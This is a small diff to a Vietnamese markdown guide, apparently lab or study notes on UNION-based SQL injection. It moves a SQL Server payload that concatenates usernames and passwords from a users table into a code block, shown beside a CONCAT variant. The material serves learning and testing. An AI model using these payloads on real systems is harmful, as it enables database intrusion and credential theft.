@@ -32,7 +32,11 @@ Vì chỉ có một cột hiển thị, ta cần nối username và password l�
 ' UNION SELECT CONCAT(username, ' - ', password) FROM users--
 ```
 
-**' UNION SELECT username + ' - ' + password FROM users--**
+**SQL SERVER**
+
+```
+' UNION SELECT username + ' - ' + password FROM users--
+```
 
 **_Nếu gặp lỗi do NULL_**
 
